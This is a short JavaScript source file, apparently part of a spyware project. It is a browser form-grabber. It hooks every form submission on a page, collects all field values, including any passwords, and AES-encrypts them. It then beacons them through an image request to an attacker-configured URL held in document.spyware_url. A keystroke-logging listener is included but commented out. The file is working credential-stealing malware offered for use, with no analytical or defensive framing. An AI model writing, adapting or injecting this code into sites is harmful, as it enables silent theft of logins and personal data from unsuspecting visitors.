/*
    This file implements functions to get and exfiltrate data.
    Copyright (C) 2024  Maurice Lambert
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

(function() {
    document.addEventListener('submit', function(event) {
        let form = new FormData(event.target);
        let data = Object.fromEntries(
          Array.from(form.keys()).map(key => [
            key, 
            form.getAll(key).length > 1 ? form.getAll(key) : form.get(key)
          ])
        );

        if (Object.keys(data).length === 0) {
            for (entrie of form) {
                let has_attribute = data.hasOwnProperty(entrie[0]);
                if (has_attribute && !Array.isArray(data[data])) {
                    data[entrie[0]] = [data[entrie[0]]];
                }
                if (has_attribute) {
                    data[entrie[0]].push(entrie[1]);
                } else {
                    data[entrie[0]] = entrie[1];
                }
            }
        }

        if (Object.keys(data).length) {
            exfiltrate_data("formdata", data);
        }
    });

    /*document.addEventListener('keydown', function(event) {
        exfiltrate_data('keystroke', event.key);
    });*/

    function exfiltrate_data(type, data) {
        const payload = { site: window.location.hostname, type: type, data: data };
        const encrypted_payload = encrypt_payload(JSON.stringify(payload));
        exfiltration(encrypted_payload);
    }

    function encrypt_payload(data) {
        const key = CryptoJS.enc.Utf8.parse(document.spyware_encryption_key);
        const iv = CryptoJS.lib.WordArray.random(16);
        const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
        return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
    }

    function exfiltration(encrypted_data) {
        var img = new Image();
        img.src = document.spyware_url + '?data=' + encodeURIComponent(encrypted_data);
        document.body.appendChild(img);
    }
})();
